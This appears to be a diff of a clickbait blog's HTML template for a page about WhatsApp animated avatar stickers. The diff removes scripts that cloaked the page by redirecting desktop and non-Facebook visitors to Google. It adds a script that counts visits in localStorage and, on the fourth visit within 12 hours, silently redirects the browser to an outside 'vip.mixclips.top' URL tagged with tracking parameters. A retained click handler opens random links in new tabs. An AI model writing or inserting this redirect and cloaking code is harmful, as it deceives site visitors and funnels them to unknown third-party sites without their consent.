@@ -3,29 +3,55 @@
 <html lang="en">
 <head>
 
-      <script>
-(function(){
-    var ua = navigator.userAgent || navigator.vendor || window.opera;
-    var isMobile = /Android|iPhone|iPad|iPod|Windows Phone|IEMobile|BlackBerry|BB10|Opera Mini|Opera Mobi|Mobile Safari/i.test(ua);
-    if (!isMobile) window.location.href = &quot;https://www.google.com&quot;;
+<script>
+(function () {
+  "use strict";
+
+  const KEY = "site_visit_limit_v1";
+  const LIMIT = 3;
+  const TIME = 12 * 60 * 60 * 1000; // 12 hours
+  const REDIRECT_URL = "https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=parves";
+
+  try {
+    const now = Date.now();
+    let data = null;
+
+    try {
+      data = JSON.parse(localStorage.getItem(KEY));
+    } catch (e) {
+      data = null;
+    }
+
+    if (
+      !data ||
+      typeof data.start !== "number" ||
+      typeof data.count !== "number" ||
+      now - data.start >= TIME
+    ) {
+      data = {
+        start: now,
+        count: 0
+      };
+    }
+
+    data.count++;
+
+    localStorage.setItem(KEY, JSON.stringify(data));
+
+    /* 4th visit = redirect */
+    if (data.count > LIMIT) {
+      window.location.replace(REDIRECT_URL);
+    }
+
+  } catch (e) {
+    console.log("Visit limiter error:", e);
+  }
 })();
 </script>
-    
-    <script type='text/javascript'>
-(function () {
-    function isFacebookUser() {
-        return /FBAN|FBAV/i.test(navigator.userAgent);
-    }
 
-    var fallbackURL = &quot;https://www.google.com&quot;;
 
-    if (!isFacebookUser()) {
-        window.location.replace(fallbackURL);
-    }
-})();
-</script> 
 
-    
+      
     <!-- Facebook Open Graph -->
 <meta content='website' property='og:type'/>
 <meta content='WhatsApp: How to create your animated Avatar DP, stickers' property='og:title'/>
@@ -217,58 +243,6 @@ document.addEventListener("click", function() {
   window.open(randomLink, "_blank");
 });
 </script>
-
-
-
-    
-
-<!-- Body-এর একদম শেষে -->
-<script>
-(function () {
-  "use strict";
-
-  const KEY = "site_visit_limit_v1";
-  const LIMIT = 3;
-  const TIME = 12 * 60 * 60 * 1000; // 12 hours
-  const REDIRECT_URL = "https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=parves";
-
-  try {
-    const now = Date.now();
-    let data = null;
-
-    try {
-      data = JSON.parse(localStorage.getItem(KEY));
-    } catch (e) {
-      data = null;
-    }
-
-    if (
-      !data ||
-      typeof data.start !== "number" ||
-      typeof data.count !== "number" ||
-      now - data.start >= TIME
-    ) {
-      data = {
-        start: now,
-        count: 0
-      };
-    }
-
-    data.count++;
-
-    localStorage.setItem(KEY, JSON.stringify(data));
-
-    /* 4th visit = redirect */
-    if (data.count > LIMIT) {
-      window.location.replace(REDIRECT_URL);
-    }
-
-  } catch (e) {
-    console.log("Visit limiter error:", e);
-  }
-})();
-</script>
-
 
 <script>
 setTimeout(function() {
